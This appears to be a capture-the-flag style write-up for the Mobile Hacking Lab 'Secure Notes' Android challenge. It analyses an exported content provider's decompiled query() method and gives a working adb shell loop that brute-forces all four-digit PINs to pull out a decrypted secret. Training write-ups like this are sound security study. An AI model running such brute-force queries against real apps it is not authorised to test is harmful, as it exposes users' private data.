
# Secure Notes

This lab focuses on getting a PIN that's hidden behind a content provider. A content provider is a component that manages data like a small database and lets other apps read or write it, using a `content://` link instead of touching files directly. If a content provider is exported and doesn't protect what it gives back, anyone can ask it for data directly and pull out things they shouldn't be able to see


<p align="center">
  <img width="220" alt="logo" src="https://github.com/user-attachments/assets/337ec819-560a-4fc2-9da0-f0b3ba67bc78" />
</p>

<p align="center">
  <a href="https://academy.mobilehackinglab.com/course/lab-secure-notes">
    <img src="https://img.shields.io/badge/View%20the%20Lab-blue?style=for-the-badge" alt="View the Lab" />
  </a>
</p>

## Static Analysis

When we open the manifest with JADX, we will find the provider that we are looking for:

```xml
<provider
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>
```

And if we look closer, we'll see that the exported is true, which means we can reach it from outside the app.

Now let's jump into `SecretDataProvider` to see how it actually works.

Looking at the `query()` function:

```java
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    Object m130constructorimpl;
    Intrinsics.checkNotNullParameter(uri, "uri");
    MatrixCursor matrixCursor = null;
    if (selection == null || !StringsKt.startsWith$default(selection, "pin=", false, 2, (Object) null)) {
        return null;
    }
    String removePrefix = StringsKt.removePrefix(selection, (CharSequence) "pin=");
    try {
        StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE;
        String format = String.format("%04d", Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1));
        Intrinsics.checkNotNullExpressionValue(format, "format(format, *args)");
        try {
            Result.Companion companion = Result.INSTANCE;
            SecretDataProvider $this$query_u24lambda_u241 = this;
            m130constructorimpl = Result.m130constructorimpl($this$query_u24lambda_u241.decryptSecret(format));
        } catch (Throwable th) {
            Result.Companion companion2 = Result.INSTANCE;
            m130constructorimpl = Result.m130constructorimpl(ResultKt.createFailure(th));
        }
        if (Result.m136isFailureimpl(m130constructorimpl)) {
            m130constructorimpl = null;
        }
        String secret = (String) m130constructorimpl;
        if (secret != null) {
            MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{"Secret"});
            $this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret});
            matrixCursor = $this$query_u24lambda_u243_u24lambda_u242;
        }
        return matrixCursor;
    } catch (NumberFormatException e) {
        return null;
    }
}
```

Let's break this down:

```java

if (selection == null || !StringsKt.startsWith$default(selection, "pin=", false, 2, (Object) null)) {

    return null;

}

```

The query expects a `selection` that starts with `pin=`. If we don't send it like that, it just returns nothing.

```java

String removePrefix = StringsKt.removePrefix(selection, (CharSequence) "pin=");

```

It removes the `pin=` part, so only the number we sent is left.

```java

String format = String.format("%04d", Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1));

```

It turns that number into 4 digits, adding zeros if needed (so `7` becomes `0007`).

```java

m130constructorimpl = Result.m130constructorimpl($this$query_u24lambda_u241.decryptSecret(format));

```

It takes that 4-digit number and sends it straight into `decryptSecret()` this is the important part, our PIN is used as the input.

```java

String secret = (String) m130constructorimpl;

if (secret != null) {

    MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{"Secret"});

    $this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret});

    matrixCursor = $this$query_u24lambda_u243_u24lambda_u242;

}

return matrixCursor;

```

If `decryptSecret()` works (no error), we get the result back with a column called `Secret` holding the decrypted value. If it fails, we just get `null` back.

So the whole function comes down to this: we send a PIN, and it tries to use that PIN to decrypt something. If we guess the right PIN, we get the decrypted secret back directly.

So the whole idea is guessing the right PIN, and of course we won't just sit there and try each one manually, we'll use a loop to try all possible PINs from `0000` to `9999`. This technique is called brute force.

## Exploitation

Now that we know the whole idea is guessing the right PIN, let's build the loop and run it.

```bash
adb shell 'for pin in $(seq -w 0 9999); do
    result=$(content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where "pin=$pin")
    if [[ "$result" != "No result found." ]]; then
        echo "PIN: $pin -> $result"
    fi
done'
```

Let's break this command down:

- `adb shell '...'` runs the whole loop on the device itself, in one connection, instead of connecting again for every single try.
- `for pin in $(seq -w 0 9999); do ... done`  goes through every number from `0000` to `9999`.
- `content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where "pin=$pin"` sends the query to the content provider, in the `pin=...` format it expects.
- `if [[ "$result" != "No result found." ]]` only shows a result if the provider actually gave one back (a wrong PIN gives nothing).

Running it, we get:

<p align="center">
  <img width="700" alt="Brute force result showing the flag" src="https://github.com/user-attachments/assets/a86df831-be5d-42d9-bdc5-6b46dd3f5af6" />
</p>

Notice some wrong PINs still show a result. That's normal, a wrong key can still turn into random broken text instead of giving an error. The real PIN is the one that gives back text you can actually read.

As final proof, here's the PIN working in the app itself:

<p align="center">
  <img width="220" alt="PIN unlocked in app" src="https://github.com/user-attachments/assets/3f9fed84-0c7c-411d-a522-0eb58c0aa53f" />
</p>

## Outcome

This lab showed that content providers can leak data directly if they're exported and don't check who's asking. We didn't need to touch the app's UI at all, we just sent queries straight to the provider and let it do the work for us. It also showed that a PIN isn't just something you type in, here it was actually used as the password to unlock the real data, so guessing it the right way (brute force) was enough to get everything.

The lesson: an exported content provider is basically an open door to your app's data if you don't check who's asking.

---

I hope this write-up was helpful. Feel free to reach out if you have any questions or feedback and if you found it useful, a star ⭐ on the repo is always appreciated!
